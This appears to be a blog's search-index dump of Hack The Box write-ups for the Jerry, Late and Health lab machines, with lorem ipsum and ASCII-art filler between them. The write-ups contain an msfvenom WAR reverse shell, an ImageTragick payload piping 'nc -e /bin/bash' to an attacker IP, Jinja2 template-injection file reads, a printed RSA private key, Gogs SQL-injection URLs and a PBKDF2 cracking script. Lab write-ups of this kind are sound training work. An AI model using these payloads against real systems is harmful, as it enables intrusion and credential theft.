    "text": "“Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry’s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.”\n\n██╗ ██╗███████╗███████╗██████╗ ██║ ██║██╔════╝██╔════╝██╔══██╗ ██║ ██║███████╗█████╗ ██████╔╝ ██║ ██║╚════██║██╔══╝ ██╔══██╗ ╚██████╔╝███████║███████╗██║ ██║ ╚═════╝ ╚══════╝╚══════╝╚═╝ ╚═╝\n\n[root:/git/htb/jerry]# nmap -Pn -n -sCV 10.10.10.95 –open (master✱) PORT STATE SERVICE VERSION 8080/tcp open http Apache Tomcat/Coyote JSP engine 1.1 |_http-favicon: Apache Tomcat |_http-open-proxy: Proxy might be redirecting requests |_http-server-header: Apache-Coyote/1.1 |_http-title: Apache Tomcat/7.0.88\nVisit the webpage and we see the default Apache Tomcat side. We have three interesting options, ‘Server Status’, ‘Manager App’ and ‘Host Manager’.\n\nPress ‘Manager App’ and try to login with default credentials tomcat:s3cret.\nOnce logged in, we can instantly see the option to upload WAR files. Create a WAR reverse shell with msfvenom and upload.\n[root:/git/htb/jerry]# msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.11 LPORT=4488 -f war &gt; rev.war (master✱) Payload size: 1088 bytes Final size of war file: 1088 bytes\nThe file is uploaded without any issues, we can trigger the shell by visiting http://10.10.10.95:8080/rev/\n[root:/git/htb/jerry]# rlwrap nc -lvnp 4488 (master✱) listening on [any] 4488 … connect to [10.10.14.11] from (UNKNOWN) [10.10.10.95] 49192 Microsoft Windows [Version 6.3.9600] (c) 2013 Microsoft Corporation. All rights reserved.\nC:-tomcat-7.0.88&gt; whoami nt authority\nC:-tomcat-7.0.88&gt;\n\nGrab user.txt and root.txt\n\nC:&gt; type “2 for the price of 1.txt” user.txt 7004dbcef0f854e0fb401875f26ebd00\nroot.txt 04a8b36e1545a455393d067e772fe90e\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██████╗ ██████╗ ██████╗ ████████╗ ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝ ██████╔╝██║ ██║██║ ██║ ██║ ██╔══██╗██║ ██║██║ ██║ ██║ ██║ ██║╚██████╔╝╚██████╔╝ ██║ ╚═╝ ╚═╝ ╚═════╝ ╚═════╝ ╚═╝\n\n\n\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██╗███╗ ██╗███████╗ ██████╗ ██████╗ ███╗ ███╗ █████╗ ████████╗██╗ ██████╗ ███╗ ██╗ ██║████╗ ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗ ██║ ██║██╔██╗ ██║█████╗ ██║ ██║██████╔╝██╔████╔██║███████║ ██║ ██║██║ ██║██╔██╗ ██║ ██║██║╚██╗██║██╔══╝ ██║ ██║██╔══██╗██║╚██╔╝██║██╔══██║ ██║ ██║██║ ██║██║╚██╗██║ ██║██║ ╚████║██║ ╚██████╔╝██║ ██║██║ ╚═╝ ██║██║ ██║ ██║ ██║╚██████╔╝██║ ╚████║ ╚═╝╚═╝ ╚═══╝╚═╝ ╚═════╝ ╚═╝ ╚═╝╚═╝ ╚═╝╚═╝ ╚═╝ ╚═╝ ╚═╝ ╚═════╝ ╚═╝ ╚═══╝"
  },
  {
    "objectID": "posts/2022-05-16-htb-writeup-late/2022-05-16-htb-writeup-late.html",
    "href": "posts/2022-05-16-htb-writeup-late/2022-05-16-htb-writeup-late.html",
    "title": "Late - Hack The Box",
    "section": "",
    "text": "nmap:\n➜  late nmap -p- -v 10.10.11.156\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\n\n➜  late nmap -p22,80 -sCV 10.10.11.156\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 02:5e:29:0e:a3:af:4e:72:9d:a4:fe:0d:cb:5d:83:07 (RSA)\n|   256 41:e1:fe:03:a5:c7:97:c4:d5:16:77:f3:41:0c:e9:fb (ECDSA)\n|_  256 28:39:46:98:17:1e:46:1a:1e:a1:ab:3b:9a:57:70:48 (ED25519)\n80/tcp open  http    nginx 1.14.0 (Ubuntu)\n|_http-server-header: nginx/1.14.0 (Ubuntu)\n|_http-title: Late - Best online image tools\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\n\n[root:/git/htb/pandora]# nmap -sU --top-port=20 --open 10.10.11.136\nPORT     STATE         SERVICE\n67/udp   open|filtered dhcps\n68/udp   open|filtered dhcpc\n135/udp  open|filtered msrpc\n137/udp  open|filtered netbios-ns\n138/udp  open|filtered netbios-dgm\n161/udp  open          snmp\n520/udp  open|filtered route\n4500/udp open|filtered nat-t-ike\nBrowsing the webpage we find images.late.htb, add it to /etc/hosts and proceed. The site is very basic and lets us upload an image which will be converted to a text document.\n This lead me down the road of “ImageTragick” trying to inject code with the following string:\npush graphic-context\nviewbox 0 0 640 480\nfill 'url(https://nothing/here.jpg\"|nc -e /bin/bash 10.10.14.18 \"4488)'\npop graphic-context\nAlthough it gave nothing.. so instead we look on the later part of the description “.. with flask”, why do they specify that? Reading about Flask vulnerabilities we find a lot of information about Flask and Jinja, specifically Server-Side Template Injections (SSTI), where the HTB box Doctor is referenced.\nWe go to HackTricks and grab all the different operations to find which template engine is being used.\n## REQUEST\n${7*7}\n{% raw %}{{7*7}}{% endraw %}\n{% raw %}{{7*'7'}}{% endraw %}\n&lt;%= 7*7 %&gt;\n#{7*7}\n\n## RESPONSE\n${7*7}\n49\n7777777\n&lt;%= 7*7 %&gt;\n#{7*7}\nWe see that both {% raw %}{7*7}{% endraw %} and {% raw %}{7*'7'}{% endraw %} are calculated/modified. Looking on the “SSTI chart” we can deduce it’s either the template engine Jinja2, Twig or Unknown.\n\nTwig: {% raw %}{{7*‘7’}}{% endraw %} = 49\nJinja2: {% raw %}{{7*‘7’}}{% endraw %} = 7777777\nWe’ve successfully detected the template engine, Jinja2.\n\n\n\n\n\n\n### Step 2 Playing around with Jinja2 terms I tried to go with: {% raw %}{ get_flashed_messages.__globals__.__builtins__.open(\"/etc/passwd\").read() }{% endraw %}\n\n\nAfter trying several fonts in different sizes, I finally got it to work with Hack Regular size 35.\n\n\nbash ## REPLY root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin syslog:x:102:106::/home/syslog:/usr/sbin/nologin messagebus:x:103:107::/nonexistent:/usr/sbin/nologin _apt:x:104:65534::/nonexistent:/usr/sbin/nologin lxd:x:105:65534::/var/lib/lxd/:/bin/false uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin pollinate:x:109:1::/var/cache/pollinate:/bin/false sshd:x:110:65534::/run/sshd:/usr/sbin/nologin svc_acc:x:1000:1000:Service Account:/home/svc_acc:/bin/bash rtkit:x:111:114:RealtimeKit,,,:/proc:/usr/sbin/nologin usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin avahi:x:113:116:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin cups-pk-helper:x:114:117:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin saned:x:115:119::/var/lib/saned:/usr/sbin/nologin colord:x:116:120:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin pulse:x:117:121:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin geoclue:x:118:123::/var/lib/geoclue:/usr/sbin/nologin smmta:x:119:124:Mail Transfer Agent,,,:/var/lib/sendmail:/usr/sbin/nologin smmsp:x:120:125:Mail Submission Program,,,:/var/lib/sendmail:/usr/sbin/nologin\n\n\nWe find 2 users available to login:\n\n\nLooking for a ssh private key we find /home/svc_acc/.ssh/id_rsa. ```bash ## REQUEST {% raw %}{{get_flashed_messages.__globals__.__builtins__.open(“/home/svc_acc/.ssh/id_rsa”).read()}}{% endraw %}\n\n\n## RESPONSE —–BEGIN RSA PRIVATE KEY—– MIIEpAIBAAKCAQEAqe5XWFKVqleCyfzPo4HsfRR8uF/P/3Tn+fiAUHhnGvBBAyrM HiP3S/DnqdIH2uqTXdPk4eGdXynzMnFRzbYb+cBa+R8T/nTa3PSuR9tkiqhXTaEO bgjRSynr2NuDWPQhX8OmhAKdJhZfErZUcbxiuncrKnoClZLQ6ZZDaNTtTUwpUaMi /mtaHzLID1KTl+dUFsLQYmdRUA639xkz1YvDF5ObIDoeHgOU7rZV4TqA6s6gI7W7 d137M3Oi2WTWRBzcWTAMwfSJ2cEttvS/AnE/B2Eelj1shYUZuPyIoLhSMicGnhB7 7IKpZeQ+MgksRcHJ5fJ2hvTu/T3yL9tggf9DsQIDAQABAoIBAHCBinbBhrGW6tLM fLSmimptq/1uAgoB3qxTaLDeZnUhaAmuxiGWcl5nCxoWInlAIX1XkwwyEb01yvw0 ppJp5a+/OPwDJXus5lKv9MtCaBidR9/vp9wWHmuDP9D91MKKL6Z1pMN175GN8jgz W0lKDpuh1oRy708UOxjMEalQgCRSGkJYDpM4pJkk/c7aHYw6GQKhoN1en/7I50IZ uFB4CzS1bgAglNb7Y1bCJ913F5oWs0dvN5ezQ28gy92pGfNIJrk3cxO33SD9CCwC T9KJxoUhuoCuMs00PxtJMymaHvOkDYSXOyHHHPSlIJl2ZezXZMFswHhnWGuNe9IH Ql49ezkCgYEA0OTVbOT/EivAuu+QPaLvC0N8GEtn7uOPu9j1HjAvuOhom6K4troi WEBJ3pvIsrUlLd9J3cY7ciRxnbanN/Qt9rHDu9Mc+W5DQAQGPWFxk4bM7Zxnb7Ng Hr4+hcK+SYNn5fCX5qjmzE6c/5+sbQ20jhl20kxVT26MvoAB9+I1ku8CgYEA0EA7 t4UB/PaoU0+kz1dNDEyNamSe5mXh/Hc/mX9cj5cQFABN9lBTcmfZ5R6I0ifXpZuq 0xEKNYA3HS5qvOI3dHj6O4JZBDUzCgZFmlI5fslxLtl57WnlwSCGHLdP/knKxHIE uJBIk0KSZBeT8F7IfUukZjCYO0y4HtDP3DUqE18CgYBgI5EeRt4lrMFMx4io9V3y 3yIzxDCXP2AdYiKdvCuafEv4pRFB97RqzVux+hyKMthjnkpOqTcetysbHL8k/1pQ GUwuG2FQYrDMu41rnnc5IGccTElGnVV1kLURtqkBCFs+9lXSsJVYHi4fb4tZvV8F ry6CZuM0ZXqdCijdvtxNPQKBgQC7F1oPEAGvP/INltncJPRlfkj2MpvHJfUXGhMb Vh7UKcUaEwP3rEar270YaIxHMeA9OlMH+KERW7UoFFF0jE+B5kX5PKu4agsGkIfr kr9wto1mp58wuhjdntid59qH+8edIUo4ffeVxRM7tSsFokHAvzpdTH8Xl1864CI+ Fc1NRQKBgQDNiTT446GIijU7XiJEwhOec2m4ykdnrSVb45Y6HKD9VS6vGeOF1oAL K6+2ZlpmytN3RiR9UDJ4kjMjhJAiC7RBetZOor6CBKg20XA1oXS7o1eOdyc/jSk0 kxruFUgLHh7nEx/5/0r8gmcoCvFn98wvUPSNrgDJ25mnwYI0zzDrEw== —–END RSA PRIVATE KEY—– ```\n\n\nLogin and grab user.txt:"
  },
  {
    "objectID": "posts/2022-05-16-htb-writeup-late/2022-05-16-htb-writeup-late.html#references",
    "href": "posts/2022-05-16-htb-writeup-late/2022-05-16-htb-writeup-late.html#references",
    "title": "Late - Hack The Box",
    "section": "References",
    "text": "References\nSSTI: https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection"
  },
  {
    "objectID": "posts/2022-08-24-htb-writeup-health/2022-08-24-htb-writeup-health.html",
    "href": "posts/2022-08-24-htb-writeup-health/2022-08-24-htb-writeup-health.html",
    "title": "Health - Hack The Box",
    "section": "",
    "text": "nmap:\n➜  ~ nmap -Pn -n -p- 10.129.9.180 -v\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-08-23 09:17 CEST\nInitiating Connect Scan at 09:17\nScanning 10.129.9.180 [65535 ports]\nDiscovered open port 80/tcp on 10.129.9.180\nDiscovered open port 22/tcp on 10.129.9.180\nCompleted Connect Scan at 09:17, 10.64s elapsed (65535 total ports)\nNmap scan report for 10.129.9.180\nHost is up (0.026s latency).\nNot shown: 65532 closed tcp ports (conn-refused)\nPORT     STATE    SERVICE\n22/tcp   open     ssh\n80/tcp   open     http\n3000/tcp filtered ppp\n\n\n➜  ~ nmap -Pn -n -p 22,80,3000 10.129.9.180 -sCV\nPORT     STATE    SERVICE VERSION\n22/tcp   open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 32:b7:f4:d4:2f:45:d3:30:ee:12:3b:03:67:bb:e6:31 (RSA)\n|   256 86:e1:5d:8c:29:39:ac:d7:e8:15:e6:49:e2:35:ed:0c (ECDSA)\n|_  256 ef:6b:ad:64:d5:e4:5b:3e:66:79:49:f4:ec:4c:23:9f (ED25519)\n80/tcp   open     http    Apache httpd 2.4.29 ((Ubuntu))\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n|_http-title: HTTP Monitoring Tool\n3000/tcp filtered ppp\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\nVisiting http://10.129.9.180 we find the domain health.htb in the footer, add it to /etc/hosts. The website allows us to configure a Webhook to check if a remote http service is available or not.\n\nMost likely we should find a way to exploit the webhook service, however I’d like to check if there are any vulnerabilities present first. Looking at the source code we find hints that Laravel is running, verify this by running webanalyze. If it’s an older version we know that this might be exploitable to “token Unserialize Remote Command Execution” or RCE through Laravel’s debugging feature.\n➜  webanalyze ./webanalyze -host http://health.htb\n :: webanalyze        : v1.0\n :: workers           : 4\n :: apps              : technologies.json\n :: crawl count       : 0\n :: search subdomains : true\n :: follow redirects  : false\n\nhttp://health.htb (0.1s):\n    Apache, 2.4.29 (Web servers)\n    Ubuntu,  (Operating systems)\n    Laravel,  (Web frameworks)\n    PHP,  (Programming languages)\nTo check if debugging is enabled visit http://10.129.9.180/profile and we see it’s not. Investigating the token unserialize RCE we need the app_key to exploit, something we cannot find at this point. Also, this is an older vulnerability that works on Laravel version 5.5.40 / 5.6.x &lt; 5.6.30, and visiting http://health.htb/webhook we find that they are running Laravel version 8.83.13.\nBack the the Webhook Service. Popularized by GitHub, Webhooks are the modern way for apps to receive notifications / events from other servers. A Webhook is a way for you to define a URL that is called by another service when a particular event occurs. For example, you can configure your repo on GitHub to have a Webhook that calls http://exploit.se/pr when a new Pull Request is created.\nIf we for example set the Webhook URL to:\nhttps://echo-webhook.exploit.se/SOMETHING_UNIQUE\nNow when the other service does its POST to that URL the request body is cached and can be retrieved via a GET to the same URL. Here is a simple cURL to demonstrate:\ncurl -H \"content-type: application/json\" -d '{\"foo\": \"bar\"}' https://echo-webhook.exploit.se/foobar\ncurl https://echo-webhook.exploit.se/foobar\n{\"foo\":\"bar\"}\nTranslated to this box, we set the Payload URL to where we want to receive data. We will get an incomming POST request, and either setup a nc listener or a webserver capable to receive POSTs.\nThe Monitored URL is what ever we want to retreive information from, after playing around with this parameter for a good while I noticed that I can bypass the restrictions on port 3000 by pointing to myself and having a 301 Redirect to http://127.0.0.1:3000\n\n➜  health python3 redirect.py 80 http://127.0.0.1:3000\n10.129.9.180 - - [23/Aug/2022 12:32:01] \"GET / HTTP/1.0\" 302 -\n\n➜  health nc -lvnp 8888                               \nlistening on [any] 8888 ...\nconnect to [10.10.14.20] from (UNKNOWN) [10.129.9.180] 59780\nPOST / HTTP/1.1\nHost: 10.10.14.20:8888\nAccept: */*\nContent-type: application/json\nContent-Length: 7663\nExpect: 100-continue\n\n{\"webhookUrl\":\"http:\\/\\/10.10.14.20:8888\\/\",\"monitoredUrl\":\"http:\\/\\/10.10.14.20\\/\",\"health\":\"up\",\"body\": \n[... snip ...] \ncontent=\\\"Gogs(Go Git Service) a painless self-hosted Git Service written in Go\\\"\n[... snip ...]\nid=\\\"footer-rights\\\"&gt;\\u00a9 2014 GoGits \\u00b7 Version: 0.5.5.1010 Beta\n\n\n\nReading about gogs version 0.5.5.1010 it’s vulnerable to SQL Injection through the search.\nThe PoC code isn’t working right of the bat, we’re returned \"health\":\"down\" indicating that the SQL syntax is broken somewhere.\nhttp://www.example.com/api/v1/users/search?q='/**/and/**/false)/**/union/**/\nselect/**/null,null,@@version,null,null,null,null,null,null,null,null,null,null,\nnull,null,null,null,null,null,null,null,null,null,null,null,null,null/**/from\n/**/mysql.db/**/where/**/('%25'%3D'\nPlaying around and trying to simplify I get simple ORDER BY to give some response:\n➜  health python3 redirect.py 80 \"http://127.0.0.1:3000/api/v1/users/search?q=')/**/order/**/by/**/27--/**/-\"\n10.129.9.180 - - [23/Aug/2022 16:10:00] \"GET / HTTP/1.0\" 302 -\n\n➜  health python3 webserv.py 8888\nINFO:root:POST request,\nPath: /\nHeaders:\nHost: 10.10.14.20:8888\nAccept: */*\nContent-type: application/json\nContent-Length: 575\n\n\n\nBody:\n{\"webhookUrl\":\"http:\\/\\/10.10.14.20:8888\\/\",\"monitoredUrl\":\"http:\\/\\/10.10.14.20\\/\",\"health\":\"up\",\"body\":\"{\\\"data\\\":[{\\\"username\\\":\\\"susanne\\\",\\\"avatar\\\":\\\"\\/\\/1.gravatar.com\\/avatar\\/c11d48f16f254e918744183ef7b89fce\\\"}],\\\"ok\\\":true}\",\"message\":\"HTTP\\/1.0 302 Found\",\"headers\":{\"Server\":\"BaseHTTP\\/0.6 Python\\/3.10.5\",\"Date\":\"Tue, 23 Aug 2022 14:08:01 GMT\",\"Location\":\"http:\\/\\/127.0.0.1:3000\\/api\\/v1\\/users\\/search?q=')\\/**\\/order\\/**\\/by\\/**\\/20--\\/**\\/-\",\"Content-Type\":\"application\\/json; charset=UTF-8\",\"Set-Cookie\":\"_csrf=; Path=\\/; Max-Age=0\",\"Content-Length\":\"111\"}}\n\n10.129.9.180 - - [23/Aug/2022 16:08:00] \"POST / HTTP/1.1\" 200 -\nNOTE: {\\\"data\\\":[{\\\"username\\\":\\\"susanne\\\",\\\"avatar\\\":\\\"\\/\\/1.gravatar.com\\/avatar\\/c11d48f16f254e918744183ef7b89fce\\\"} is the exfiltrated data. Normally it just returns {\\\"data\\\":[]\\}.\nBut trying with 28 columns breaks the syntax.\nNext we need to find a injectable column, and trying the normal @@version doesn’t give any result. As hinted from the poc, column 3 should be injectable so after playing around with some commands I able to extract the username (which I already knew) - thus proving that column 3 is correct and we should focus more here.\n➜  health python3 redirect.py 80 \"http://127.0.0.1:3000/api/v1/users/search?q=')/**/union/**/all/**/select/**/null,null,(select/**/name/**/from/**/user),null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--/**/-\"\n10.129.9.180 - - [23/Aug/2022 16:57:01] \"GET / HTTP/1.0\" 302 -\n\n\n## Response\nINFO:root:POST request,\nPath: /\nHeaders:\nHost: 10.10.14.20:8888\nAccept: */*\nContent-type: application/json\nContent-Length: 825\n\nBody:\n{\"webhookUrl\":\"http:\\/\\/10.10.14.20:8888\\/\",\"monitoredUrl\":\"http:\\/\\/10.10.14.20\\/\",\"health\":\"up\",\"body\":\"{\\\"data\\\":[{\\\"username\\\":\\\"susanne\\\",\\\"avatar\\\":\\\"\\/\\/1.gravatar.com\\/avatar\\/c11d48f16f254e918744183ef7b89fce\\\"},{\\\"username\\\":\\\"susanne\\\",\\\"avatar\\\":\\\"\\/\\/1.gravatar.com\\/avatar\\/\\\"}],\\\"ok\\\":true}\",\"message\":\"HTTP\\/1.0 302 Found\",\"headers\":{\"Server\":\"BaseHTTP\\/0.6 Python\\/3.10.5\",\"Date\":\"Tue, 23 Aug 2022 14:57:01 GMT\",\"Location\":\"http:\\/\\/127.0.0.1:3000\\/api\\/v1\\/users\\/search?q=')\\/**\\/union\\/**\\/all\\/**\\/select\\/**\\/null,null,(select\\/**\\/name\\/**\\/from\\/**\\/user),null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--\\/**\\/-\",\"Content-Type\":\"application\\/json; charset=UTF-8\",\"Set-Cookie\":\"_csrf=; Path=\\/; Max-Age=0\",\"Content-Length\":\"170\"}}\n\n10.129.9.180 - - [23/Aug/2022 16:57:01] \"POST / HTTP/1.1\" 200 -\nTesting more password and pass both returns \"health\":\"down\", but passwd returns a hash!\n➜  health python3 redirect.py 80 \"http://127.0.0.1:3000/api/v1/users/search?q=')/**/union/**/all/**/select/**/null,null,(select/**/passwd/**/from/**/user),null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--/**/-\"\n10.129.9.180 - - [23/Aug/2022 16:59:01] \"GET / HTTP/1.0\" 302 -\n\n## Response\nBody:\n{\"webhookUrl\":\"http:\\/\\/10.10.14.20:8888\\/\",\"monitoredUrl\":\"http:\\/\\/10.10.14.20\\/\",\"health\":\"up\",\"body\":\"{\\\"data\\\":[{\\\"username\\\":\\\"susanne\\\",\\\"avatar\\\":\\\"\\/\\/1.gravatar.com\\/avatar\\/c11d48f16f254e918744183ef7b89fce\\\"},{\\\"username\\\":\\\"66c074645545781f1064fb7fd1177453db8f0ca2ce58a9d81c04be2e6d3ba2a0d6c032f0fd4ef83f48d74349ec196f4efe37\\\",\\\"avatar\\\":\\\"\\/\\/1.gravatar.com\\/avatar\\/\\\"}],\\\"ok\\\":true}\",\"message\":\"HTTP\\/1.0 302 Found\",\"headers\":{\"Server\":\"BaseHTTP\\/0.6 Python\\/3.10.5\",\"Date\":\"Tue, 23 Aug 2022 14:59:01 GMT\",\"Location\":\"http:\\/\\/127.0.0.1:3000\\/api\\/v1\\/users\\/search?q=')\\/**\\/union\\/**\\/all\\/**\\/select\\/**\\/null,null,(select\\/**\\/passwd\\/**\\/from\\/**\\/user),null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--\\/**\\/-\",\"Content-Type\":\"application\\/json; charset=UTF-8\",\"Set-Cookie\":\"_csrf=; Path=\\/; Max-Age=0\",\"Content-Length\":\"263\"}}\n\n10.129.9.180 - - [23/Aug/2022 16:59:01] \"POST / HTTP/1.1\" 200 -\nThe extracted hash is very long and I don’t recognize it, and using hash-identifier we get the response Not Found. Reading a bit about Gogs password hash I find this blog post where a user locked himself out of Gogs trying to create a new hash. Here we find that a salt is needed and we should be able to extract it the same way we did with passwd. Unfortunately this blog post doesn’t succeed in replicating the hash, so we need to dig deeper for that.\n➜  health python3 redirect.py 80 \"http://127.0.0.1:3000/api/v1/users/search?q=')/**/union/**/all/**/select/**/null,null,(select/**/passwd/**/from/**/user),null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--/**/-\"\n10.129.9.180 - - [24/Aug/2022 08:46:01] \"GET / HTTP/1.0\" 302 -\n\n\n## Response\nBody:\n{\"webhookUrl\":\"http:\\/\\/10.10.14.20:8888\\/\",\"monitoredUrl\":\"http:\\/\\/10.10.14.20\\/\",\"health\":\"up\",\"body\":\"{\\\"data\\\":[{\\\"username\\\":\\\"susanne\\\",\\\"avatar\\\":\\\"\\/\\/1.gravatar.com\\/avatar\\/c11d48f16f254e918744183ef7b89fce\\\"},{\\\"username\\\":\\\"sO3XIbeW14\\\",\\\"avatar\\\":\\\"\\/\\/1.gravatar.com\\/avatar\\/\\\"}],\\\"ok\\\":true}\",\"message\":\"HTTP\\/1.0 302 Found\",\"headers\":{\"Server\":\"BaseHTTP\\/0.6 Python\\/3.10.5\",\"Date\":\"Wed, 24 Aug 2022 06:45:01 GMT\",\"Location\":\"http:\\/\\/127.0.0.1:3000\\/api\\/v1\\/users\\/search?q=')\\/**\\/union\\/**\\/all\\/**\\/select\\/**\\/null,null,(select\\/**\\/salt\\/**\\/from\\/**\\/user),null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--\\/**\\/-\",\"Content-Type\":\"application\\/json; charset=UTF-8\",\"Set-Cookie\":\"_csrf=; Path=\\/; Max-Age=0\",\"Content-Length\":\"173\"}}\nSo now we have all three needed ingredients needed to build and crack the password and hopefully gain access to the system: 1. Username: susanne 2. Hash: 66c074645545781f1064fb7fd1177453db8f0ca2ce58a9d81c04be2e6d3ba2a0d6c032f0fd4ef83f48d74349ec196f4efe37 3. Salt: sO3XIbeW14\n\n\n\nDownloading the source code for Gogs 0.5.5 and looking for the password encoding function we find this on line 117:\n// gogs/models/user.go\nnewPasswd := base.PBKDF2([]byte(u.Passwd), []byte(u.Salt), 10000, 50, sha256.New)\nAs I see it we can solve this two different ways; 1. The programmatically simple solution where we make a script encode a string with the same algorithm and salt, and compare the end result to the found hash. 2. Or make a script that reformats hash + salt to hashcat format.\nSince I’m not a programmer, I chose to go with option one, knowing this will take far longer to crack as I’ll never build anything as efficient as hashcat. Googling around I found this post and used it as foundation for my script. I made some tweaks to import strings from list and fired it up:\n#!/usr/bin/python3\nimport hashlib\nimport binascii\n\ndef main():\n    salt = b'sO3XIbeW14'\n    iterations = 10000\n    count = 0\n    \n    ### ---=== START ===---\n    ##Segment for easy troubleshooting\n    #password = b'test'\n    #key = hashlib.pbkdf2_hmac(\"sha256\", password, salt, iterations, 50)\n    #print(key.hex())\n    #print(binascii.hexlify(key))\n    #pwcompare(key.hex(),password)\n    ### ---=== END ===---\n\n    file = input('Enter path to password file: ')\n    with open(file) as pw_file:\n        for passwd in pw_file:\n            s = passwd.rstrip()\n            pw_byte = bytes(s, encoding='utf-8')\n            key = hashlib.pbkdf2_hmac(\"sha256\", pw_byte, salt, iterations, 50)\n            count = count + 1\n            pwcompare(key.hex(),s,count)\n\ndef pwcompare(hex_key,password,count):\n    target_key = '66c074645545781f1064fb7fd1177453db8f0ca2ce58a9d81c04be2e6d3ba2a0d6c032f0fd4ef83f48d74349ec196f4efe37'\n    \n    ## Troubleshooting hash for b'test'\n    #target_key = 'fa21b095cfa6e55dff39c11c2ba8a75e7392a9a34f24207d10b38fcde7a0b252a38590631ca6acf3257c8a7edb7598498de9'\n    \n    if hex_key == target_key:\n        print(count,\"---=== Password is:\",password, \"===---\")\n        exit()\n    else:\n        print(count,\"- Testing password:\",password)\n\nif __name__ == \"__main__\":\n    main()\n➜  health ./decrypt.py\nEnter path to password file: /usr/share/wordlists/rockyou.txt   \n1 - Testing password: 123456\n2 - Testing password: 12345\n[... snip ...]\n70966 - Testing password: feilunhai\n70967 ---=== Password is: february15 ===---\nTest to login with cracked credentials and grab user.txt\n➜  health ssh susanne@health.htb\nsusanne@health.htb password: february15\n\nsusanne@health:~$ id && cat user.txt\nuid=1000(susanne) gid=1000(susanne) groups=1000(susanne)\na47815867df7df685c95bd170197d921\n\n\n\n# Root ### Step 1 As always, start with sudo -l to look for a easy privesc vector.\n\n\nNo dice. Do some manual enumeration and look for anything interesting in ~, /opt, /var/log, /var/www/, /tmp, /dev/shm or /\n\n\nThere doesn’t seem to be the case of password reuse, it might be a good idea to dump the database to find more hashes to crack but I think that’s to easy. Instead continue enumerating with pspy64 and/or linPEAS.\n\n\nEvery minute we see the same set of tasks:\n\n\nReading about TRUNCATE I find this: &gt; TRUNCATE TABLE empties a table completely. It requires the DROP privilege. &gt; Logically, TRUNCATE TABLE is similar to a DELETE statement that deletes all rows, or a sequence of DROP TABLE and CREATE TABLE statements.\n\n\nSo why are they truncating table tasks every minute, and what can we do with that information?\n\n\nIf would make sense that the webhook we create will be put in the tasks table. Create a new webhook/task from the webpage and verify.\n\n\nsql mysql&gt; use laravel Database changed mysql&gt; show tables; +------------------------+ | Tables_in_laravel      | +------------------------+ | failed_jobs            | | migrations             | | password_resets        | | personal_access_tokens | | tasks                  | | users                  | +------------------------+ mysql&gt; select * from tasks; +--------------------------------------+--------------------------+-----------+---------------------+-------------+---------------------+---------------------+ | id                                   | webhookUrl               | onlyError | monitoredUrl        | frequency   | created_at          | updated_at          | +--------------------------------------+--------------------------+-----------+---------------------+-------------+---------------------+---------------------+ | 341fc709-d2c8-48e4-9c41-636656bdfad8 | http://10.10.14.20:8888/ |         0 | http://10.10.14.20/ | */1 * * * * | 2022-08-24 09:46:23 | 2022-08-24 09:46:23 | 